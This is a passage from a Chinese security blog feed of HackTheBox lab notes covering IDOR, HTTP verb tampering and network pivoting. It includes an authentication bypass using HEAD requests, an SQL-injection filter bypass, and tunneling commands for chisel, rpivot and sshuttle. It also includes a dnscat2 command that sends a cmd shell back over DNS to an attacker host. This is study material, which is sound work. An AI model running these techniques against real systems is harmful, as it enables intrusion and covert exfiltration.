一旦我们枚举了所有用户，我们将找到一个具有以下详细信息的管理员用户：</p><p>通过将我们从IDOR information Disclosure漏洞获得的信息与API端点上的IDOR Insecure Function Calls攻击相结合，我们可以修改其他用户的详细信息并创建&#x2F;删除用户，同时绕过各种访问控制检查。在许多情况下，我们通过IDOR漏洞泄露的信息可以用于其他攻击，如IDOR或XSS，从而导致更复杂的攻击或绕过现有的安全机制。 有了我们的新角色，我们还可以执行批量分配来更改所有用户的特定字段，比如在他们的配置文件中放置XSS有效载荷，或者将他们的电子邮件更改为我们指定的电子邮件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Intro-to-IDOR&quot;&gt;&lt;a href=&quot;#Intro-to-IDOR&quot; class=&quot;headerlink&quot; title=&quot;Intro to IDOR&quot;&gt;&lt;/a&gt;Intro to IDOR&lt;/h1&gt;&lt;p&gt;不安全的直接对象引用（IDOR）漏洞是最常见的web</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-HTTP Verb Tampering</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks/</id>
    <published>2023-09-06T06:52:16.000Z</published>
    <updated>2023-09-06T08:17:32.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-HTTP-Verb-Tampering"><a href="#Intro-to-HTTP-Verb-Tampering" class="headerlink" title="Intro to HTTP Verb Tampering"></a>Intro to HTTP Verb Tampering</h1><p>HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。</p><span id="more"></span><h2 id="HTTP-Verb-Tampering"><a href="#HTTP-Verb-Tampering" class="headerlink" title="HTTP Verb Tampering"></a>HTTP Verb Tampering</h2><p> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 different verbs</a></p><p>可以想象，上面的一些方法可以执行非常敏感的功能，比如将（PUT）或删除（DELETE）文件写入后端服务器上的webroot目录。正如Web请求模块中所讨论的，如果Web服务器没有安全地配置为管理这些方法，我们可以使用它们来控制后端服务器。然而，HTTP谓词篡改攻击更常见（因此更为关键）的原因是，它们是由后端web服务器或web应用程序中的错误配置引起的，这两者都可能导致漏洞。</p><h2 id="Insecure-Configurations"><a href="#Insecure-Configurations" class="headerlink" title="Insecure Configurations"></a>Insecure Configurations</h2><p>不安全的web服务器配置导致第一类HTTP谓词篡改漏洞。web服务器的身份验证配置可能仅限于特定的HTTP方法，这将使一些HTTP方法在没有身份验证的情况下可以访问。例如，系统管理员可以使用以下配置要求对特定网页进行身份验证：</p><pre><code class="xml">&lt;Limit GET POST&gt;    Require valid-user&lt;/Limit&gt;</code></pre><p>正如我们所看到的，即使配置为身份验证方法指定了GET和POST请求，攻击者仍然可能使用不同的HTTP方法（如HEAD）来完全绕过此身份验证机制，这将在下一节中看到。这最终导致身份验证绕过，并允许攻击者访问他们不应该访问的网页和域。</p><h2 id="Insecure-Coding"><a href="#Insecure-Coding" class="headerlink" title="Insecure Coding"></a>Insecure Coding</h2><p>不安全的编码实践会导致其他类型的HTTP谓词篡改漏洞（尽管有些人可能不考虑这种谓词篡改）。当web开发人员应用特定的过滤器来减轻特定的漏洞，而不使用该过滤器覆盖所有HTTP方法时，就会发生这种情况。例如，如果发现某个网页易受SQL注入漏洞的攻击，并且后端开发人员通过以下应用输入净化筛选器来减轻SQL注入漏洞：</p><pre><code class="php">$pattern = &quot;/^[A-Za-z\s]+$/&quot;;if(preg_match($pattern, $_GET[&quot;code&quot;])) &#123;    $query = &quot;Select * from ports where port_code like &#39;%&quot; . $_REQUEST[&quot;code&quot;] . &quot;%&#39;&quot;;    ...SNIP...&#125;</code></pre><p>我们可以看到，过滤器&#x3D;&#x3D;只在GET参数&#x3D;&#x3D;上进行测试。如果GET请求不包含任何坏字符，那么将执行查询。但是，在执行查询时，会使用$_REQUEST[“code”]参数，这些参数也可能包含POST参数，从而导致HTTP谓词的使用不一致。在这种情况下，攻击者可能会使用POST请求来执行SQL注入，在这种情况中，GET参数将为空（不包括任何坏字符）。该请求将通过安全过滤器，这将使函数仍然容易受到SQL注入的攻击。 虽然上述两个漏洞都是在公共场合发现的，但第二个漏洞要常见得多，因为它是由于编码错误造成的，而第一个漏洞通常可以通过安全的web服务器配置来避免，因为文档经常警告不要这样做。在接下来的部分中，我们将看到这两种类型的示例以及如何利用它们。</p><h1 id="Bypassing-Basic-Authentication"><a href="#Bypassing-Basic-Authentication" class="headerlink" title="Bypassing Basic Authentication"></a>Bypassing Basic Authentication</h1><p>利用HTTP谓词篡改漏洞通常是一个相对简单的过程。我们只需要尝试其他HTTP方法，看看web服务器和web应用程序是如何处理它们的。虽然许多自动漏洞扫描工具可以一致地识别由不安全的服务器配置引起的HTTP Verb篡改漏洞，但它们通常无法识别由不可靠的编码引起的HTTP篡改漏洞。这是因为一旦我们绕过身份验证页面，第一种类型就可以很容易地识别出来，而另一种类型则需要主动测试，看看我们是否可以绕过现有的安全过滤器。 第一种类型的HTTP谓词篡改漏洞主要由不安全的Web服务器配置引起，利用该漏洞可以绕过某些页面上的HTTP基本身份验证提示。</p><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>当我们在本节结束时开始练习时，我们看到我们有一个基本的File Manager web应用程序，在其中我们可以通过键入新文件的名称并点击enter来添加新文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525315.jpeg" alt="img"></p><p>但是，假设我们试图通过单击红色的“重置”按钮来删除所有文件。在这种情况下，我们看到该功能似乎仅限于经过身份验证的用户，因为我们得到了以下HTTP基本身份验证提示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525778.jpeg" alt="img"></p><p>由于我们没有任何凭据，我们将获得一个401未经授权的页面：由于我们没有任何凭据，我们将获得一个401未经授权的页面</p><p>所以，让我们看看我们是否可以通过HTTP动词篡改攻击绕过这一点。为此，我们需要确定哪些页面受到此身份验证的限制。如果我们在点击Reset按钮后检查HTTP请求，或者在点击该按钮后查看该按钮导航到的URL，我们会发现它位于&#x2F;admin&#x2F;Reset.php。因此，&#x2F;admin目录仅限于经过身份验证的用户，或者只有&#x2F;admin&#x2F;recet.php页面。我们可以通过访问&#x2F;admin目录来确认这一点，并且确实会提示我们再次登录。这意味着完整的&#x2F;admin目录受到限制。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>为了尝试利用该页面，我们需要确定web应用程序使用的HTTP请求方法。我们可以在Burp Suite中拦截请求并进行检查：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525863.jpeg" alt="unauthorized_request"></p><p>由于页面使用GET请求，我们可以发送POST请求，并查看网页是否允许POST请求（即验证是否涵盖POST请求）。要做到这一点，我们可以右键点击Burp中拦截的请求，然后选择Change request Method，它会自动将请求更改为POST请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526919.jpeg" alt="change_request"></p><p>完成后，我们可以单击“前进”并在浏览器中查看页面。不幸的是，如果我们不提供凭据，我们仍然会被提示登录，并将获得401未经授权的页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526326.jpeg" alt="img"></p><p>因此，web服务器配置似乎同时涵盖了GET和POST请求。然而，正如我们之前所了解到的，我们可以使用许多其他HTTP方法，最显著的是HEAD方法，它与GET请求相同，但不会在HTTP响应中返回正文。如果成功，我们可能不会收到任何输出，但重置功能仍应执行，这是我们的主要目标。 要查看服务器是否接受HEAD请求，我们可以向其发送OPTIONS请求，并查看接受了哪些HTTP方法，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/HTTP/1.1 200 OKDate: Server: Apache/2.4.41 (Ubuntu)Allow: POST,OPTIONS,HEAD,GETContent-Length: 0Content-Type: httpd/unix-directory</code></pre><p>正如我们所看到的，响应显示Allow:POST、OPTIONS、HEAD、GET，这意味着web服务器确实接受HEAD请求，这是许多web服务器的默认配置。因此，让我们再次尝试拦截重置请求，这次使用HEAD请求来查看web服务器如何处理它：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529974.jpeg" alt="HEAD_request"></p><p>一旦我们将POST更改为HEAD并转发请求，我们将看到我们不再得到登录提示或401未授权页面，而是得到一个空输出，正如HEAD请求所预期的那样。如果我们返回到File Manager web应用程序，我们将看到所有文件确实已被删除，这意味着我们在没有管理员访问权限或任何凭据的情况下成功触发了重置功能：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529688.jpeg" alt="img"></p><h1 id="Bypassing-Security-Filters"><a href="#Bypassing-Security-Filters" class="headerlink" title="Bypassing Security Filters"></a>Bypassing Security Filters</h1><p>另一种更常见的HTTP谓词篡改漏洞是由web应用程序开发过程中出现的不安全编码错误引起的，这导致web应用程序无法覆盖某些功能中的所有HTTP方法。这通常出现在检测恶意请求的安全筛选器中。例如，如果安全过滤器用于检测注入漏洞，并且只检查POST参数（例如$_POST[参数]）中的注入，则可以通过将请求方法更改为GET来绕过它。</p><p>为了避免我们的代码中存在HTTP Verb篡改漏洞，我们必须与HTTP方法的使用保持一致，并确保相同的方法始终用于整个web应用程序的任何特定功能。始终建议通过测试所有请求参数来扩大安全筛选器中的测试范围。这可以通过以下函数和变量来实现：</p><table><thead><tr><th>Language</th><th>Function</th></tr></thead><tbody><tr><td>PHP</td><td><code>$_REQUEST[&#39;param&#39;]</code></td></tr><tr><td>Java</td><td><code>request.getParameter(&#39;param&#39;)</code></td></tr><tr><td>C#</td><td><code>Request[&#39;param&#39;]</code></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-HTTP-Verb-Tampering&quot;&gt;&lt;a href=&quot;#Intro-to-HTTP-Verb-Tampering&quot; class=&quot;headerlink&quot; title=&quot;Intro to HTTP Verb Tampering&quot;&gt;&lt;/a&gt;Intro to HTTP Verb Tampering&lt;/h1&gt;&lt;p&gt;HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&amp;#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting Around Obstacles &amp; Branching Out Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/"/>
    <id>https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/</id>
    <published>2023-09-03T08:08:15.000Z</published>
    <updated>2023-09-17T08:53:47.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSH-for-Windows-plink-exe"><a href="#SSH-for-Windows-plink-exe" class="headerlink" title="SSH for Windows: plink.exe"></a>SSH for Windows: plink.exe</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Plink</a>PuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 <a href="https://www.putty.org/">PuTTY</a>。</p><p>如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。</p><h2 id="Getting-To-Know-Plink"><a href="#Getting-To-Know-Plink" class="headerlink" title="Getting To Know Plink"></a>Getting To Know Plink</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031617228.png" alt="img"></p><p>Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH会话，然后plink开始在端口9050上侦听。</p><pre><code class="cmd-session">plink -D 9050 ubuntu@10.129.15.50</code></pre><p>另一个名为 <a href="https://www.proxifier.com/">Proxifier</a>的基于Windows的工具可以用于通过我们创建的SSH会话启动SOCKS隧道。Proxifier是一个Windows工具，它为桌面客户端应用程序创建隧道网络，允许它通过SOCKS或HTTPS代理进行操作，并允许代理链接。可以创建一个配置文件，在其中我们可以为Plink在端口9050上启动的SOCKS服务器提供配置。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031619809.png" alt="img"></p><p>在为127.0.0.1和端口9050配置SOCKS服务器后，我们可以直接启动mstsc.exe来启动与允许RDP连接的Windows目标的RDP会话。</p><h1 id="SSH-Pivoting-with-Sshuttle"><a href="#SSH-Pivoting-with-Sshuttle" class="headerlink" title="SSH Pivoting with Sshuttle"></a>SSH Pivoting with Sshuttle</h1><p><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a>是另一个用Python编写的工具，它消除了配置proxychain的需要。但是，此工具仅适用于通过SSH进行数据透视，而不提供通过TOR或HTTPS代理服务器进行数据透视的其他选项。Sshuttle对于自动执行iptables和为远程主机添加数据透视规则非常有用。我们可以将Ubuntu服务器配置为一个支点，并使用本节稍后的示例使用sshuttle路由Nmap的所有网络流量。 sshuttle的一个有趣用法是，我们不需要使用proxychans来连接到远程主机。让我们通过Ubuntu pivot主机安装sshuttle，并将其配置为通过RDP连接到Windows主机。</p><h4 id="Installing-sshuttle"><a href="#Installing-sshuttle" class="headerlink" title="Installing sshuttle"></a>Installing sshuttle</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get install sshuttle</code></pre><p>要使用sshuttle，我们指定选项-r以使用用户名和密码连接到远程机器。然后，我们需要包括我们想要通过枢轴主机路由的网络或IP，在我们的情况下，是网络172.16.5.0&#x2F;23。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v </code></pre><p>使用此命令，sshuttle在我们的iptables中创建一个条目，通过pivot主机将所有流量重定向到172.16.5.0&#x2F;23网络。</p><h4 id="Traffic-Routing-through-iptables-Routes"><a href="#Traffic-Routing-through-iptables-Routes" class="headerlink" title="Traffic Routing through iptables Routes"></a>Traffic Routing through iptables Routes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn</code></pre><p>我们现在可以直接使用任何工具，而无需使用proxychains。</p><blockquote><p>xfreerdp 默认情况下可能不信任自签名证书<code>/cert-ignore</code> 选项会忽略证书验证错误。</p></blockquote><h1 id="Web-Server-Pivoting-with-Rpivot"><a href="#Web-Server-Pivoting-with-Rpivot" class="headerlink" title="Web Server Pivoting with Rpivot"></a>Web Server Pivoting with Rpivot</h1><p><a href="https://github.com/klsecservices/rpivot">Rpivot</a></p><p>Rpivot是一个用Python编写的用于SOCKS隧道的反向SOCKS代理工具。Rpivot将公司网络内的计算机绑定到外部服务器，并在服务器端公开客户端的本地端口。我们将采用下面的场景，在我们的内部网络上有一个web服务器（172.16.5.135），我们想使用rpivot代理访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031654234.png" alt="img"></p><p>我们可以使用以下命令启动rpivot SOCKS代理服务器，以允许客户端在端口9999上连接，并在端口9050上侦听代理枢轴连接。</p><h4 id="Cloning-rpivot"><a href="#Cloning-rpivot" class="headerlink" title="Cloning rpivot"></a>Cloning rpivot</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git</code></pre><p>我们可以启动rpivot SOCKS代理服务器，使用server.py连接到受损的Ubuntu服务器上的客户端。</p><pre><code class="shell-session">Running server.py from the Attack HostTanin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></pre><p>在运行client.py之前，我们需要将rpivot传输到目标。我们可以使用此SCP命令执行此操作：</p><h4 id="Transfering-rpivot-to-the-Target"><a href="#Transfering-rpivot-to-the-Target" class="headerlink" title="Transfering rpivot to the Target"></a>Transfering rpivot to the Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></pre><h4 id="Running-client-py-from-Pivot-Target"><a href="#Running-client-py-from-Pivot-Target" class="headerlink" title="Running client.py from Pivot Target"></a>Running client.py from Pivot Target</h4><pre><code class="shell-session">ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port 9999</code></pre><h4 id="Confirming-Connection-is-Established"><a href="#Confirming-Connection-is-Established" class="headerlink" title="Confirming Connection is Established"></a>Confirming Connection is Established</h4><pre><code class="shell-session">New connection from host 10.129.202.64, source port 35226</code></pre><p>我们将在我们的攻击主机127.0.0.1:9050上配置proxychans以在本地服务器上进行转移，该攻击主机最初是由Python服务器启动的。 最后，我们应该能够使用proxychains和Firefox访问服务器端的Web服务器，该服务器托管在172.16.5.0&#x2F;23的内部网络上，172.16.5.135:80。</p><h4 id="Browsing-to-the-Target-Webserver-using-Proxychains"><a href="#Browsing-to-the-Target-Webserver-using-Proxychains" class="headerlink" title="Browsing to the Target Webserver using Proxychains"></a>Browsing to the Target Webserver using Proxychains</h4><pre><code class="shell-session">proxychains firefox-esr 172.16.5.135:80</code></pre><p>与上面的pivot代理类似，在某些情况下，我们可能无法直接转向云上的外部服务器（攻击主机）。某些组织使用域控制器配置了 <a href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a>。在这种情况下，我们可以为rpivot提供一个额外的NTLM身份验证选项，通过提供用户名和密码来通过NTLM代理进行身份验证。在这些情况下，我们可以通过以下方式使用rpivot的client.py：</p><h4 id="Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><a href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth" class="headerlink" title="Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth"></a>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</h4><pre><code class="shell-session">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></pre><h1 id="Branching-Out-Our-Tunnels"><a href="#Branching-Out-Our-Tunnels" class="headerlink" title="Branching Out Our Tunnels"></a>Branching Out Our Tunnels</h1><h1 id="DNS-Tunneling-with-Dnscat2"><a href="#DNS-Tunneling-with-Dnscat2" class="headerlink" title="DNS Tunneling with Dnscat2"></a>DNS Tunneling with Dnscat2</h1><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a></p><p>Dnscat2是一种隧道工具，使用DNS协议在两个主机之间发送数据。它使用加密的命令和控制（C&amp;C或C2）通道，并在DNS协议内的TXT记录内发送数据。通常，公司网络中的每个active directory域环境都有自己的DNS服务器，该服务器将主机名解析为IP地址，并将流量路由到参与总体DNS系统的外部DNS服务器。但是，对于dnscat2，地址解析是从外部服务器请求的。当本地DNS服务器试图解析地址时，数据会被过滤并通过网络发送，而不是合法的DNS请求。Dnscat2可以是一种极为隐蔽的方法来过滤数据，同时避免防火墙检测，因为防火墙检测会剥离HTTPS连接并探查流量。对于我们的测试示例，我们可以在攻击主机上使用dnscat2服务器，并在另一台Windows主机上执行dnscat2客户端。</p><h2 id="Setting-Up-amp-Using-dnscat2"><a href="#Setting-Up-amp-Using-dnscat2" class="headerlink" title="Setting Up &amp; Using dnscat2"></a>Setting Up &amp; Using dnscat2</h2><p>如果dnscat2尚未在我们的攻击主机上设置，我们可以使用以下命令进行设置：</p><h4 id="Cloning-dnscat2-and-Setting-Up-the-Server"><a href="#Cloning-dnscat2-and-Setting-Up-the-Server" class="headerlink" title="Cloning dnscat2 and Setting Up the Server"></a>Cloning dnscat2 and Setting Up the Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git</code></pre><h4 id="Starting-the-dnscat2-server"><a href="#Starting-the-dnscat2-server" class="headerlink" title="Starting the dnscat2 server"></a>Starting the dnscat2 server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></pre><p>运行服务器后，它将向我们提供密钥，我们必须将密钥提供给Windows主机上的dnscat2客户端，以便它可以对发送到外部dnscat2服务器的数据进行身份验证和加密。我们可以将客户端与dnscat2项目一起使用，也可以使用 <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>，这是一个基于dnscat2兼容powershell的客户端，我们可以从Windows目标运行该客户端，以与我们的dnscat2服务器建立隧道。我们可以将包含客户端文件的项目克隆到我们的攻击主机，然后将其传输到目标。</p><h4 id="Cloning-dnscat2-powershell-to-the-Attack-Host"><a href="#Cloning-dnscat2-powershell-to-the-Attack-Host" class="headerlink" title="Cloning dnscat2-powershell to the Attack Host"></a>Cloning dnscat2-powershell to the Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></pre><p>一旦dnscat2.ps1文件在目标上，我们就可以导入它并运行相关的cmdlet。</p><h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1</code></pre><p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p><pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.47 -Domain inlanefreight.local -PreSharedSecret 166752dc4191131dce8195327eb078fe -Exec cmd </code></pre><p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p><h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)dnscat2&gt;</code></pre><p>我们可以通过输入？列出dnscat2的选项？在提示下。</p><pre><code class="shell-session">dnscat2&gt; ?Here is a list of commands (use -h on any of them for additional help):* echo* help* kill* quit* set* start* stop* tunnels* unset* window* windows</code></pre><p>我们可以使用dnscat2与会话进行交互，并在参与的目标环境中进一步移动。在本模块中，我们不会涵盖dnscat2的所有可能性，但我们强烈鼓励您使用它进行练习，甚至可能找到创造性的方法在参与中使用它。让我们与已建立的会话进行交互，然后进入shell。</p><h4 id="Interacting-with-the-Established-Session"><a href="#Interacting-with-the-Established-Session" class="headerlink" title="Interacting with the Established Session"></a>Interacting with the Established Session</h4><pre><code class="shell-session">dnscat2&gt; window -i 1New window created: 1history_size (session) =&gt; 1000Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)This is a console session!That means that anything you type will be sent as-is to theclient, and anything they type will be displayed as-is on thescreen! If the client is executing a command and you don&#39;tsee a prompt, try typing &#39;pwd&#39; or something!To go back, type ctrl-z.Microsoft Windows [Version 10.0.18363.1801](c) 2019 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;exec (OFFICEMANAGER) 1&gt;</code></pre><h1 id="SOCKS5-Tunneling-with-Chisel"><a href="#SOCKS5-Tunneling-with-Chisel" class="headerlink" title="SOCKS5 Tunneling with Chisel"></a>SOCKS5 Tunneling with Chisel</h1><p><a href="https://github.com/jpillora/chisel">Chisel</a> </p><p>Chisel是一个用Go编写的基于TCP&#x2F;UDP的隧道工具，它使用HTTP传输使用SSH保护的数据。Chisel可以在防火墙受限的环境中创建客户端-服务器隧道连接。让我们考虑一种情况，即我们必须通过隧道将流量传输到172.16.5.0&#x2F;23网络（内部网络）上的Web服务器。我们有地址为172.16.5.19的域控制器。由于我们的攻击主机和域控制器属于不同的网段，因此攻击主机无法直接访问它。然而，由于我们已经破坏了Ubuntu服务器，我们可以在其上启动一个Chisel服务器，该服务器将监听特定端口，并通过已建立的隧道将我们的流量转发到内部网络。</p><h2 id="Setting-Up-amp-Using-Chisel"><a href="#Setting-Up-amp-Using-Chisel" class="headerlink" title="Setting Up &amp; Using Chisel"></a>Setting Up &amp; Using Chisel</h2><p>在我们使用Chisel之前，我们需要在我们的攻击主机上安装它。如果我们的攻击主机上没有Chisel，我们可以使用下面的命令克隆项目repo：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git</code></pre><p>我们需要在系统上安装编程语言Go来构建Chisel二进制文件。在系统上安装Go后，我们可以进入该目录，并使用Go-build构建Chisel二进制文件。</p><h4 id="Building-the-Chisel-Binary"><a href="#Building-the-Chisel-Binary" class="headerlink" title="Building the Chisel Binary"></a>Building the Chisel Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cd chiselgo build</code></pre><p>注意我们传输到客户网络上目标上的文件的大小可能会有所帮助，这不仅是出于性能原因，还考虑到检测。补充这一特定概念的两个有益资源是Oxdf的博客文章“<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>”和IppSec对盒子Reddish的演练。IppSec在视频的24:29开始解释Chisel，构建二进制并缩小二进制的大小。 一旦构建了二进制文件，我们就可以使用SCP将其传输到目标枢轴主机。</p><pre><code class="shell-session">anin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/ ubuntu@10.129.202.64&#39;s password: chisel                                        100%   11MB   1.2MB/s   00:09    </code></pre><p>Then we can start the Chisel server&#x2F;listener.</p><h4 id="Running-the-Chisel-Server-on-the-Pivot-Host"><a href="#Running-the-Chisel-Server-on-the-Pivot-Host" class="headerlink" title="Running the Chisel Server on the Pivot Host"></a>Running the Chisel Server on the Pivot Host</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks52022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234</code></pre><p>Chisel侦听器将使用SOCKS5（–SOCKS5）侦听端口1234上的传入连接，并将其转发到可从枢轴主机访问的所有网络。在我们的案例中，枢轴主机在172.16.5.0&#x2F;23网络上有一个接口，这将允许我们访问该网络上的主机。 我们可以在攻击主机上启动客户端并连接到Chisel服务器。</p><h4 id="Connecting-to-the-Chisel-Server"><a href="#Connecting-to-the-Chisel-Server" class="headerlink" title="Connecting to the Chisel Server"></a>Connecting to the Chisel Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:12342022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies2022/05/05 14:21:19 client: Handshaking...2022/05/05 14:21:19 client: Sending config2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)2022/05/05 14:21:19 client: tun: SSH connected</code></pre><p>正如您在上面的输出中看到的，Chisel客户端已经通过HTTP在Chisel服务器和客户端之间创建了一个TCP&#x2F;UDP隧道，该隧道使用SSH进行安全保护，并且已经开始在1080端口上侦听。现在，我们可以修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans.cconf文件，并在末尾添加1080端口，这样我们就可以使用proxychans使用创建的1080端口和SSH隧道之间的隧道进行透视。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf ##       proxy types: http, socks4, socks5#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )#[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;# socks4 127.0.0.1 9050socks5 127.0.0.1 1080</code></pre><p>现在，如果我们使用RDP的proxychains，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse 